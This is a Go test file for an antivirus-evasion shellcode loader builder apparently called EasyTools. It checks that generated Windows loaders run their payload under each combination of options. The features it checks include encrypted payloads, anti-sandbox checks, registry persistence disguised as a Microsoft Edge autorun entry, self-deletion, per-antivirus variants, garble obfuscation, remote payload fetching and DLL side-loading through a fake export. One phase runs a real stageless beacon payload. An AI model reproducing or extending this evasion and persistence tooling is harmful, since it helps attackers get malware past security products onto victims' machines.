package util

import (
	godonut "EasyTools/app/bypass/donut"
	"EasyTools/app/bypass/shell/encode"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestFrontendOptionMatrix 前端全部可选项的组合覆盖测试。
//
// 覆盖的前端选项（取值取自 ByPassAvView.vue / modeList.go）：
//
//	运行模式 mode        : loader1..loader20
//	加密方式 encodeWay   : aes / xor / chacha20 / otp
//	加载模式 loadWay     : 一体 / 分离 / 远程（白加黑由 loader10 专项覆盖）
//	反沙箱   passBoxWay  : 否 / 双击运行 / 命令行运行
//	自启动   autoRun     : true / false
//	自删除   autoDelete  : true / false
//	杀软标签 av          : 360 / wdf / hr
//	编译方式 buildWay    : go / garble
//	架构     arch        : amd64 / 386
//	保留控制台 keepConsole: true / false
//
// 全量笛卡尔积是 20×4×4×3×2×2×3×2×2 ≈ 4.6 万组，不可行；
// 因此按"维度分阶段 + 交互项优先"的方式做正交覆盖（每组都真实编译+运行并断言载荷被执行）。
//
// 运行方式（本地验证用，CI 不跑）：
//
//	go test -count=1 -timeout 5400s -run TestFrontendOptionMatrix -v ./app/bypass/shell/util/
//
// 可按阶段/模板筛选，便于定点复测：
//
//	EASYTOOLS_OPT_PHASES=1,4,6  EASYTOOLS_OPT_LOADERS=loader8
//
// 全量约 25 分钟；P1 需要仓库根目录存在 *stageless*.bin，P2-P7 使用自建标记载荷。
func TestFrontendOptionMatrix(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	ensureGoModule(t)
	workDir := filepath.Join(os.TempDir(), "EasyTools", "file")
	outBase := t.TempDir()
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		t.Fatal(err)
	}

	binPath := findRepoGlob("*stageless*.bin")
	var realBin []byte
	if binPath != "" {
		realBin, _ = os.ReadFile(binPath)
	}
	markerPIC := buildMarkerPayload(t, workDir) // 可观测副作用的标记载荷（Donut PIC）
	t.Logf("载荷: 真实 shellcode=%d 字节, 标记载荷 PIC=%d 字节", len(realBin), len(markerPIC))

	type row struct {
		phase string
		name  string
		ok    bool
		note  string
	}
	var rows []row
	record := func(phase, name string, ok bool, note string) {
		rows = append(rows, row{phase, name, ok, note})
		t.Logf("[%s] %-46s %s %s", phase, name, map[bool]string{true: "✓", false: "✗"}[ok], note)
	}

	// 可选：EASYTOOLS_OPT_PHASES=1,4,6 只跑指定阶段（迭代/定点复测用）
	wantPhase := map[string]bool{}
	for _, p := range strings.Split(os.Getenv("EASYTOOLS_OPT_PHASES"), ",") {
		if p = strings.TrimSpace(p); p != "" {
			wantPhase[p] = true
		}
	}
	phaseOn := func(n string) bool { return len(wantPhase) == 0 || wantPhase[n] }

	// 可选：EASYTOOLS_OPT_LOADERS=loader8,loader1 只跑指定模板（定点复测用）
	onlyLoader := map[string]bool{}
	for _, p := range strings.Split(os.Getenv("EASYTOOLS_OPT_LOADERS"), ",") {
		if p = strings.TrimSpace(p); p != "" {
			onlyLoader[p] = true
		}
	}
	loaderOn := func(name string) bool { return len(onlyLoader) == 0 || onlyLoader[name] }

	// ---------------- Phase 1: loader × 加密方式（20 × 4 = 80） ----------------
	if phaseOn("1") && len(realBin) > 0 {
		encodings := []string{"xor", "aes", "chacha20", "otp"}
		for _, loaderName := range allModuleNames() {
			if unixLoaderNames[loaderName] || !loaderOn(loaderName) {
				continue
			}
			for _, enc := range encodings {
				name := fmt.Sprintf("%s/%s", loaderName, enc)
				ok, note := runOptionCombo(t, workDir, outBase, "p1_"+loaderName+"_"+enc,
					loaderName, "一体", enc, "否", "false", "false", "amd64", false,
					realBin, payloadAlive, 5*time.Second, "mx1_"+loaderName+"_"+enc)
				record("P1负载×加密", name, ok, note)
			}
		}
	} else if phaseOn("1") {
		t.Log("未找到 *stageless*.bin，Phase 1 跳过")
	}

	// ---------------- Phase 2: 反沙箱 × 自启动 × 自删除（2 loader × 12 = 24） ----------------
	for _, loaderName := range []string{"loader1", LoaderBaiJiaHei} {
		if !phaseOn("2") {
			break
		}
		for _, passBox := range []string{"否", "双击运行", "命令行运行"} {
			for _, autoRun := range []string{"true", "false"} {
				for _, autoDelete := range []string{"true", "false"} {
					name := fmt.Sprintf("%s/%s/run=%s/del=%s", loaderName, passBox, autoRun, autoDelete)
					args := []string{}
					window := 8 * time.Second
					if passBox == "双击运行" {
						window = 14 * time.Second // 反沙箱先睡 6 秒
					}
					if passBox == "命令行运行" {
						args = []string{"-s", matrixSandboxToken}
					}
					ok, note := runOptionCombo(t, workDir, outBase,
						fmt.Sprintf("p2_%s_%s_%s_%s", loaderName, passSlug(passBox), autoRun, autoDelete),
						loaderName, "一体", "xor", passBox, autoRun, autoDelete, "amd64", false,
						markerPIC, payloadMarker, window, "mx2", args...)
					cleanupAutoRunRegistry()
					record("P2沙箱×自启×自删", name, ok, note)
				}
			}
		}
	}

	// ---------------- Phase 3: 杀软标签（走真实 CheckGoBuild 多变体链路） ----------------
	for _, av := range []string{"360", "wdf", "hr"} {
		if !phaseOn("3") {
			break
		}
		ok, note := runCheckGoBuildCombo(t, workDir, outBase, "p3_"+av, "loader1", "xor", av, markerPIC)
		record("P3杀软标签", "loader1/av="+av, ok, note)
	}

	// ---------------- Phase 4: 加载模式 分离 / 远程 ----------------
	for _, loaderName := range []string{"loader1", "loader5"} {
		if !phaseOn("4") {
			break
		}
		ok, note := runSeparatedCombo(t, workDir, outBase, "p4_sep_"+loaderName, loaderName, markerPIC, false)
		record("P4加载模式", loaderName+"/分离", ok, note)

		ok, note = runSeparatedCombo(t, workDir, outBase, "p4_net_"+loaderName, loaderName, markerPIC, true)
		record("P4加载模式", loaderName+"/远程", ok, note)
	}

	// ---------------- Phase 5: 架构 386 ----------------
	x86PIC := buildX86MarkerPayload(t, workDir)
	if x86PIC != nil && phaseOn("5") {
		for _, loaderName := range []string{"loader1", "loader5"} {
			ok, note := runOptionCombo(t, workDir, outBase, "p5_386_"+loaderName,
				loaderName, "一体", "xor", "否", "false", "false", "386", false,
				x86PIC, payloadMarker, 8*time.Second, "mx5_"+loaderName)
			record("P5架构386", loaderName+"/x86", ok, note)
		}
	} else {
		t.Log("x86 标记载荷构建失败，Phase 5 跳过")
	}

	// ---------------- Phase 6: 保留控制台（命令行工具输出） ----------------
	for _, keep := range []bool{true, false} {
		if !phaseOn("6") {
			break
		}
		ok, note := runConsoleCombo(t, workDir, outBase, fmt.Sprintf("p6_%v", keep), keep)
		record("P6保留控制台", fmt.Sprintf("keepConsole=%v", keep), ok, note)
	}

	// ---------------- Phase 7: 编译方式 garble ----------------
	if phaseOn("7") {
		ok, note := runGarbleCombo(t, workDir, outBase, markerPIC)
		record("P7编译方式", "garble", ok, note)
	}

	// ---------------- 汇总 ----------------
	phaseStat := map[string][2]int{}
	pass, fail := 0, 0
	for _, r := range rows {
		st := phaseStat[r.phase]
		if r.ok {
			pass++
			st[0]++
		} else {
			fail++
			st[1]++
		}
		phaseStat[r.phase] = st
	}
	for _, p := range []string{"P1负载×加密", "P2沙箱×自启×自删", "P3杀软标签", "P4加载模式", "P5架构386", "P6保留控制台", "P7编译方式"} {
		if st, ok := phaseStat[p]; ok {
			t.Logf("%-18s 通过 %d / 失败 %d", p, st[0], st[1])
		}
	}
	t.Logf("前端选项矩阵合计: 通过 %d / 失败 %d（共 %d 组）", pass, fail, pass+fail)
	if fail > 0 {
		t.Errorf("前端选项矩阵存在 %d 组失败", fail)
	}
}

const matrixSandboxToken = "e2etoken1234"

// passSlug 把反沙箱选项转成 ASCII 目录名：cgo/mingw 在含中文的构建路径下会失败
func passSlug(passBox string) string {
	switch passBox {
	case "双击运行":
		return "dblclick"
	case "命令行运行":
		return "cmdline"
	default:
		return "none"
	}
}

// procRun 统一管理测试产物的等待/终止，避免重复消费 done 通道导致死锁
type procRun struct {
	cmd  *exec.Cmd
	done chan error
	gone bool
}

func startProc(cmd *exec.Cmd) (*procRun, error) {
	if err := cmd.Start(); err != nil {
		return nil, err
	}
	p := &procRun{cmd: cmd, done: make(chan error, 1)}
	go func() { p.done <- cmd.Wait() }()
	return p, nil
}

// exitedWithin 等待至多 d，返回进程是否已退出
func (p *procRun) exitedWithin(d time.Duration) bool {
	if p.gone {
		return true
	}
	if d <= 0 {
		select {
		case <-p.done:
			p.gone = true
			return true
		default:
			return false
		}
	}
	select {
	case <-p.done:
		p.gone = true
		return true
	case <-time.After(d):
		return false
	}
}

// stop 终止（若仍在运行）并回收，可重复调用
func (p *procRun) stop() {
	if p.gone {
		return
	}
	_ = p.cmd.Process.Kill()
	<-p.done
	p.gone = true
}

func (p *procRun) exitCode() int {
	if p.cmd.ProcessState == nil {
		return -1
	}
	return p.cmd.ProcessState.ExitCode()
}

type payloadKind int

const (
	payloadAlive payloadKind = iota // beacon 类：跑满窗口仍存活即视为载荷接管执行流
	payloadMarker                   // 标记载荷：必须写出标记文件
	payloadConsole                  // 命令行工具：输出中必须出现特征串
)

var matrixMarkerPath = filepath.Join(os.TempDir(), execMarkerName)

// runOptionCombo 通用组合：写数据文件 → 生成源码 → 编译 → 后处理 → 运行 → 判定。
func runOptionCombo(t *testing.T, workDir, outBase, tag, loaderName, loadWay, encodeWay, passBox, autoRun, autoDelete, arch string, keepConsole bool, payload []byte, kind payloadKind, window time.Duration, outPrefix string, runArgs ...string) (bool, string) {
	t.Helper()
	if passBox == "命令行运行" {
		if err := os.WriteFile(filepath.Join(workDir, "SandboxToken.txt"), []byte(matrixSandboxToken), 0644); err != nil {
			return false, "写入口令失败: " + err.Error()
		}
	}
	if err := writeMatrixDataFiles(workDir, payload, ""); err != nil {
		return false, "写数据文件失败: " + err.Error()
	}
	if loaderName == LoaderBaiJiaHei {
		return runBaiJiaHeiOptionCombo(t, outBase, tag, encodeWay, passBox, autoRun, autoDelete, kind, window)
	}
	bin, err := buildMatrixLoader(t, workDir, outBase, tag, loaderName, loadWay, encodeWay, passBox, autoRun, autoDelete, arch, keepConsole)
	if err != nil {
		return false, err.Error()
	}
	return runAndJudge(t, bin, kind, window, runArgs...)
}

// buildMatrixLoader 生成源码并编译（单变体直编，与 /make 的每个变体等价）
func buildMatrixLoader(t *testing.T, workDir, outBase, tag, loaderName, loadWay, encodeWay, passBox, autoRun, autoDelete, arch string, keepConsole bool) (string, error) {
	t.Helper()
	autoDeleteTime := time.Now().Add(24 * time.Hour).Format("2006-01-02 15:04:05")
	goFile, gerr := GenGoFile(loaderName, loadWay, encodeWay, passBox, autoRun,
		autoDelete, autoDeleteTime, "false", "", "", nil, nil)
	if gerr != nil || goFile == "" {
		return "", fmt.Errorf("生成源码失败: %v", gerr)
	}
	goArch := NormalizeGoArch(arch)
	bin := filepath.Join(outBase, "mx_"+tag+".exe")
	_ = os.Remove(bin)
	cmd := exec.Command("go", "build", "-o", bin, goFile)
	cmd.Dir = workDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH="+goArch, "CGO_ENABLED=0")
	if out, berr := cmd.CombinedOutput(); berr != nil {
		return "", fmt.Errorf("编译失败: %s", firstLineOf(string(out)))
	}
	PostProcessBuiltBinary(bin, "windows", keepConsole)
	return bin, nil
}

// runAndJudge 运行产物并按载荷类型判定
func runAndJudge(t *testing.T, bin string, kind payloadKind, window time.Duration, runArgs ...string) (bool, string) {
	t.Helper()
	if kind == payloadMarker {
		_ = os.Remove(matrixMarkerPath)
	}
	outFile := filepath.Join(os.TempDir(), "easytools_matrix_debug", filepath.Base(bin)+".out")
	_ = os.MkdirAll(filepath.Dir(outFile), 0o755)
	f, _ := os.Create(outFile)
	cmd := exec.Command(bin, runArgs...)
	cmd.Stdout = f
	cmd.Stderr = f
	proc, err := startProc(cmd)
	if err != nil {
		_ = f.Close()
		return false, "启动失败: " + err.Error()
	}
	proc.exitedWithin(window)
	_ = f.Close()
	out, _ := os.ReadFile(outFile)
	s := string(out)
	crash := strings.Contains(s, "Exception 0x") || strings.Contains(s, "fatal error:")

	switch kind {
	case payloadMarker:
		if fileExists(matrixMarkerPath) {
			_ = os.Remove(matrixMarkerPath)
			proc.stop()
			return true, "载荷已执行（标记文件出现）"
		}
		proc.stop()
		if crash {
			return false, "崩溃: " + headOfString(firstLineOf(s), 60)
		}
		return false, fmt.Sprintf("标记文件未出现(code=%d)", proc.exitCode())
	case payloadConsole:
		proc.stop()
		if strings.Contains(s, "COFF/PE Dumper") || strings.Contains(s, "usage:") {
			return true, "第三方工具在 loader 内产出输出"
		}
		if crash {
			return false, "崩溃: " + headOfString(firstLineOf(s), 60)
		}
		return false, "未捕获到工具输出: " + headOfString(s, 80)
	default: // payloadAlive
		if !proc.gone {
			proc.stop()
			return true, "载荷已接管执行流（观察窗口内持续运行）"
		}
		proc.stop()
		if crash {
			return false, "崩溃: " + headOfString(firstLineOf(s), 60)
		}
		return false, fmt.Sprintf("进程提前退出(code=%d)，载荷未接管执行流", proc.exitCode())
	}
}

// writeMatrixDataFiles 写 makeFile「一体」模式所需的全部数据文件；
// urlOrFile 非空时同时写入 分离/远程 所需的加密文件名字段。
func writeMatrixDataFiles(dir string, payload []byte, urlOrFile string) error {
	xorKey, err := encode.GenerateXorKey()
	if err != nil {
		return err
	}
	aesKey := encode.GenerateAesKey()
	aesEnc, err := encode.Aes_Encrypt(append([]byte(nil), payload...), aesKey)
	if err != nil {
		return err
	}
	chKey, _ := encode.GenerateChaCha20Key()
	chNonce, _ := encode.GenerateChaCha20Nonce()
	chEnc, err := encode.ChaCha20Encrypt(chKey, chNonce, append([]byte(nil), payload...))
	if err != nil {
		return err
	}
	otpBlob, err := encode.OtpEncrypt(append([]byte(nil), payload...))
	if err != nil {
		return err
	}
	urlKey := byte(0x42)
	urlField := []byte("deadbeef")
	if urlOrFile != "" {
		urlField = []byte(encode.XorURLOrFileName(urlOrFile, urlKey))
	}
	files := map[string][]byte{
		"XorKey.txt":             encode.XorKeyToBytes(xorKey),
		"XorEncrypted.txt":       encode.XorEncrypt(append([]byte(nil), payload...), xorKey),
		"AesKey.txt":             aesKey,
		"AesEncrypted.txt":       aesEnc,
		"ChaCha20Key.txt":        chKey,
		"ChaCha20Nonce.txt":      chNonce,
		"ChaCha20Encrypted.txt":  chEnc,
		"OtpEncrypted.txt":       otpBlob,
		"UrlOrFileEncrypted.txt": urlField,
		"UrlXorKey.txt":          {urlKey},
	}
	for name, data := range files {
		if werr := os.WriteFile(filepath.Join(dir, name), data, 0644); werr != nil {
			return werr
		}
	}
	return nil
}

// cleanupAutoRunRegistry 清理自启动测试可能写入的注册表项（HKCU Run）
func cleanupAutoRunRegistry() {
	exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "MicrosoftEdgeAutoLaunch_1.59.26.99", "/f").Run()
}

// buildX86MarkerPayload 构建 x86（386）标记载荷 PIC
func buildX86MarkerPayload(t *testing.T, dir string) []byte {
	t.Helper()
	srcDir := filepath.Join(dir, "marker386")
	if err := os.MkdirAll(srcDir, 0o755); err != nil {
		return nil
	}
	src := `package main

import (
	"os"
	"strconv"
	"time"
)

func main() {
	p := os.Getenv("TEMP") + "\\` + execMarkerName + `"
	_ = os.WriteFile(p, []byte("x86 pid="+strconv.Itoa(os.Getpid())), 0644)
	time.Sleep(2 * time.Second)
}
`
	srcPath := filepath.Join(srcDir, "main.go")
	if err := os.WriteFile(srcPath, []byte(src), 0644); err != nil {
		return nil
	}
	exe := filepath.Join(srcDir, "marker386.exe")
	cmd := exec.Command("go", "build", "-o", exe, srcPath)
	cmd.Dir = srcDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=386", "CGO_ENABLED=0")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Logf("x86 载荷构建失败: %v %s", err, headOfString(string(out), 120))
		return nil
	}
	exeBytes, err := os.ReadFile(exe)
	if err != nil {
		return nil
	}
	pic, err := godonut.BuildPIC(exeBytes, "", "x86")
	if err != nil {
		t.Logf("x86 Donut 转换失败: %v", err)
		return nil
	}
	t.Logf("x86 标记载荷: exe=%d pic=%d", len(exeBytes), len(pic))
	return pic
}

// runCheckGoBuildCombo 走真实 CheckGoBuild 链路（含 4 变体 + 杀软标签 flag 过滤）
func runCheckGoBuildCombo(t *testing.T, workDir, outBase, tag, loaderName, encodeWay, av string, payload []byte) (bool, string) {
	t.Helper()
	if err := writeMatrixDataFiles(workDir, payload, ""); err != nil {
		return false, "写数据文件失败: " + err.Error()
	}
	goFile, gerr := GenGoFile(loaderName, "一体", encodeWay, "否", "false", "false", "", "false", "", "", nil, nil)
	if gerr != nil || goFile == "" {
		return false, "生成源码失败: " + fmt.Sprint(gerr)
	}
	origCwd, _ := os.Getwd()
	caseDir := filepath.Join(outBase, tag)
	_ = os.MkdirAll(caseDir, 0o755)
	if err := os.Chdir(caseDir); err != nil {
		return false, "切换目录失败: " + err.Error()
	}
	defer func() { _ = os.Chdir(origCwd) }()

	if berr := CheckGoBuild(goFile, tag+".exe", av, "go", "一体", "", "", "x64", "windows", false); berr != nil {
		return false, "CheckGoBuild 失败: " + berr.Error()
	}
	matches, _ := filepath.Glob(filepath.Join(caseDir, "EasyToolsFiles", "file", tag+"*.exe"))
	if len(matches) == 0 {
		return false, "未生成产物"
	}
	_ = os.Chdir(origCwd)
	return runAndJudge(t, matches[0], payloadMarker, 8*time.Second)
}

// runSeparatedCombo 分离 / 远程 模式：载荷文件不内联，运行时读取（本地文件 / HTTP）
func runSeparatedCombo(t *testing.T, workDir, outBase, tag, loaderName string, payload []byte, remote bool) (bool, string) {
	t.Helper()
	xorKey, err := encode.GenerateXorKey()
	if err != nil {
		return false, err.Error()
	}
	encPayload := encode.XorEncrypt(append([]byte(nil), payload...), xorKey)
	xorKeyBytes := encode.XorKeyToBytes(xorKey)

	// 先起本地 HTTP 服务（远程模式用）
	var ln net.Listener
	var url string
	const fileName = "sep_payload.bin"
	if remote {
		ln, err = net.Listen("tcp", "127.0.0.1:0")
		if err != nil {
			return false, "起本地 HTTP 失败: " + err.Error()
		}
		defer ln.Close()
		url = fmt.Sprintf("http://127.0.0.1:%d/%s", ln.Addr().(*net.TCPAddr).Port, fileName)
		srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			_, _ = w.Write(encPayload)
		})}
		go func() { _ = srv.Serve(ln) }()
		defer func() { _ = srv.Close() }()
	}

	urlKey := byte(0x42)
	target := fileName
	if remote {
		target = url
	}
	encTarget := encode.XorURLOrFileName(target, urlKey)

	if err := writeMatrixDataFiles(workDir, payload, target); err != nil {
		return false, "写数据文件失败: " + err.Error()
	}
	// 分离模式：UrlOrFileEncrypted 内联的是文件名（明文 XOR），需写入正确的 URL 字段
	files := map[string][]byte{
		"XorKey.txt":             xorKeyBytes,
		"XorEncrypted.txt":       encPayload,
		"UrlOrFileEncrypted.txt": []byte(encTarget),
		"UrlXorKey.txt":          {urlKey},
		"AesKey.txt":             make([]byte, 32),
		"AesEncrypted.txt":       {1, 2},
		"ChaCha20Key.txt":        make([]byte, 32),
		"ChaCha20Nonce.txt":      make([]byte, 12),
		"ChaCha20Encrypted.txt":  {1, 2},
		"OtpEncrypted.txt":       {1, 2},
	}
	for name, data := range files {
		if werr := os.WriteFile(filepath.Join(workDir, name), data, 0644); werr != nil {
			return false, werr.Error()
		}
	}

	bin, berr := buildMatrixLoader(t, workDir, outBase, tag, loaderName, map[bool]string{true: "远程", false: "分离"}[remote], "xor", "否", "false", "false", "amd64", false)
	if berr != nil {
		return false, berr.Error()
	}
	if !remote {
		// 分离模式要求载荷文件与 loader 同目录
		if werr := os.WriteFile(filepath.Join(filepath.Dir(bin), fileName), encPayload, 0644); werr != nil {
			return false, "写分离载荷失败: " + werr.Error()
		}
	}
	return runAndJudge(t, bin, payloadMarker, 12*time.Second)
}

// runConsoleCombo 保留控制台开关：验证该开关的真实效果——
// Subsystem 是否按预期为 Console(3)/GUI(2)，且载荷仍能执行（标记文件）。
// （不依赖命令行工具的参数传递，避免把工具自身的参数解析问题混进来；
// 第三方命令行工具的端到端验证见 TestRealThirdPartyExeExecutes。）
func runConsoleCombo(t *testing.T, workDir, outBase, tag string, keepConsole bool) (bool, string) {
	t.Helper()
	if err := writeMatrixDataFiles(workDir, markerPICGlobal(t, workDir), ""); err != nil {
		return false, err.Error()
	}
	bin, berr := buildMatrixLoader(t, workDir, outBase, tag, "loader1", "一体", "xor", "否", "false", "false", "amd64", keepConsole)
	if berr != nil {
		return false, berr.Error()
	}
	raw, rerr := os.ReadFile(bin)
	if rerr != nil {
		return false, rerr.Error()
	}
	sub, serr := peSubsystem(raw)
	if serr != nil {
		return false, "读取 Subsystem 失败: " + serr.Error()
	}
	want := uint16(0x0003) // Console
	if !keepConsole {
		want = uint16(0x0002) // GUI
	}
	if sub != want {
		return false, fmt.Sprintf("Subsystem=%d，期望 %d", sub, want)
	}
	ok, note := runAndJudge(t, bin, payloadMarker, 8*time.Second)
	if !ok {
		return false, note
	}
	return true, fmt.Sprintf("Subsystem=%d 正确且载荷已执行", sub)
}

// peSubsystem 读取 PE OptionalHeader 的 Subsystem 字段
func peSubsystem(data []byte) (uint16, error) {
	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
		return 0, fmt.Errorf("not PE")
	}
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if peOff+24+0x46 > len(data) {
		return 0, fmt.Errorf("PE 头越界")
	}
	return binary.LittleEndian.Uint16(data[peOff+24+0x44:]), nil
}

// matrixMarkerPIC 缓存标记载荷 PIC（供 phase 6 使用）
var matrixMarkerPIC []byte

func markerPICGlobal(t *testing.T, workDir string) []byte {
	t.Helper()
	if matrixMarkerPIC == nil {
		matrixMarkerPIC = buildMarkerPayload(t, workDir)
	}
	return matrixMarkerPIC
}

// runBaiJiaHeiOptionCombo loader10（白加黑）选项组合：c-shared DLL + 宿主调用导出函数。
func runBaiJiaHeiOptionCombo(t *testing.T, outBase, tag, encodeWay, passBox, autoRun, autoDelete string, kind payloadKind, window time.Duration) (bool, string) {
	t.Helper()
	const exportName = "GetAdaptersAddresses"
	autoDeleteTime := time.Now().Add(24 * time.Hour).Format("2006-01-02 15:04:05")
	goFile, gerr := GenGoFile(LoaderBaiJiaHei, "白加黑", encodeWay, passBox, autoRun,
		autoDelete, autoDeleteTime, "false", "", exportName, []string{exportName}, []string{exportName})
	if gerr != nil || goFile == "" {
		return false, "白加黑源码生成失败: " + fmt.Sprint(gerr)
	}
	caseDir := filepath.Join(outBase, tag)
	_ = os.MkdirAll(caseDir, 0o755)
	origCwd, _ := os.Getwd()
	if err := os.Chdir(caseDir); err != nil {
		return false, "切换目录失败: " + err.Error()
	}
	defer func() { _ = os.Chdir(origCwd) }()

	dllName := tag + ".dll"
	if berr := CheckGoBuild(goFile, dllName, "360", "go", "白加黑", dllName, "", "x64", "windows", false); berr != nil {
		return false, "白加黑 DLL 编译失败: " + headOfString(berr.Error(), 100)
	}
	dllPath := filepath.Join(caseDir, "EasyToolsFiles", "file", dllName)
	if _, serr := os.Stat(dllPath); serr != nil {
		return false, "DLL 未生成"
	}
	hostPath := buildDllHost(t, caseDir, dllPath, exportName)

	// 反沙箱口令校验跑在导出函数内，flag.Parse 解析的是宿主命令行：
	// 因此口令模式下用环境变量传 DLL/导出名，让宿主 argv 形如 [host -s token]
	runArgs := []string{dllPath, exportName}
	cmd := exec.Command(hostPath, runArgs...)
	if passBox == "命令行运行" {
		cmd = exec.Command(hostPath, "-s", matrixSandboxToken)
		cmd.Env = append(os.Environ(), "MATRIX_DLL="+dllPath, "MATRIX_EXPORT="+exportName)
	}
	if kind == payloadMarker {
		_ = os.Remove(matrixMarkerPath)
	}
	outFile := filepath.Join(os.TempDir(), "easytools_matrix_debug", tag+".out")
	_ = os.MkdirAll(filepath.Dir(outFile), 0o755)
	f, _ := os.Create(outFile)
	cmd.Stdout = f
	cmd.Stderr = f
	proc, err := startProc(cmd)
	if err != nil {
		_ = f.Close()
		return false, "宿主启动失败: " + err.Error()
	}
	proc.exitedWithin(window)
	_ = f.Close()
	out, _ := os.ReadFile(outFile)
	s := string(out)
	crash := strings.Contains(s, "Exception 0x") || strings.Contains(s, "fatal error:")
	if kind == payloadMarker {
		if fileExists(matrixMarkerPath) {
			_ = os.Remove(matrixMarkerPath)
			proc.stop()
			return true, "白加黑 DLL：载荷已执行（标记文件出现）"
		}
		proc.stop()
		if crash {
			return false, "白加黑 DLL 崩溃: " + headOfString(firstLineOf(s), 60)
		}
		return false, fmt.Sprintf("白加黑 DLL：标记文件未出现(code=%d)", proc.exitCode())
	}
	if !proc.gone {
		proc.stop()
		return true, "白加黑 DLL：载荷已接管执行流"
	}
	proc.stop()
	if crash {
		return false, "白加黑 DLL 崩溃"
	}
	return false, "白加黑 DLL：宿主提前退出"
}

// runGarbleCombo 编译方式 garble 可用性 + 产物执行
func runGarbleCombo(t *testing.T, workDir, outBase string, payload []byte) (bool, string) {
	t.Helper()
	if _, err := exec.LookPath("garble"); err != nil {
		return false, "未安装 garble"
	}
	out, err := exec.Command("garble", "version").CombinedOutput()
	if err != nil {
		return true, "跳过（garble 不可用: " + headOfString(strings.TrimSpace(string(out)), 100) + "）"
	}
	t.Logf("garble version: %s", strings.TrimSpace(string(out)))

	// 兼容性预检：garble 自带 Go 版本闸（例如要求 go>=1.26，本机 go1.25.x 会直接拒绝）。
	// 属环境限制，明确跳过，避免把它误报成产物缺陷。
	probeDir := t.TempDir()
	if werr := os.WriteFile(filepath.Join(probeDir, "main.go"),
		[]byte("package main\n\nfunc main() {}\n"), 0644); werr != nil {
		return false, werr.Error()
	}
	if werr := os.WriteFile(filepath.Join(probeDir, "go.mod"),
		[]byte("module garbleprobe\n\ngo 1.21\n"), 0644); werr != nil {
		return false, werr.Error()
	}
	probe := exec.Command("garble", "build", "-o", "probe.exe", "main.go")
	probe.Dir = probeDir
	if pout, perr := probe.CombinedOutput(); perr != nil {
		msg := strings.TrimSpace(string(pout))
		if strings.Contains(msg, "too old") || strings.Contains(msg, "upgrade") {
			return true, "跳过（garble 与本地 Go 版本不匹配: " + headOfString(msg, 120) + "）"
		}
		return false, "garble 基础编译失败: " + headOfString(msg, 120)
	}

	if err := writeMatrixDataFiles(workDir, payload, ""); err != nil {
		return false, err.Error()
	}
	goFile, gerr := GenGoFile("loader1", "一体", "xor", "否", "false", "false", "", "false", "", "", nil, nil)
	if gerr != nil || goFile == "" {
		return false, "生成源码失败: " + fmt.Sprint(gerr)
	}
	origCwd, _ := os.Getwd()
	caseDir := filepath.Join(outBase, "p7_garble")
	_ = os.MkdirAll(caseDir, 0o755)
	if err := os.Chdir(caseDir); err != nil {
		return false, err.Error()
	}
	defer func() { _ = os.Chdir(origCwd) }()

	if berr := CheckGoBuild(goFile, "garble.exe", "360", "garble", "一体", "", "", "x64", "windows", false); berr != nil {
		// garble 自身的版本闸（如要求 go>=1.26 而本机 1.25.x）属环境限制，记为跳过；
		// 其余编译失败如实报错（错误信息已由 CheckGoBuild 上抛，不再被吞）。
		if strings.Contains(berr.Error(), "too old") || strings.Contains(berr.Error(), "upgrade") {
			return true, "跳过（garble 与本地 Go 版本不匹配: " + headOfString(berr.Error(), 100) + "）"
		}
		return false, "garble 编译失败: " + headOfString(berr.Error(), 120)
	}
	matches, _ := filepath.Glob(filepath.Join(caseDir, "EasyToolsFiles", "file", "garble*.exe"))
	if len(matches) == 0 {
		return false, "garble 未产出产物"
	}
	_ = os.Chdir(origCwd)
	return runAndJudge(t, matches[0], payloadMarker, 8*time.Second)
}
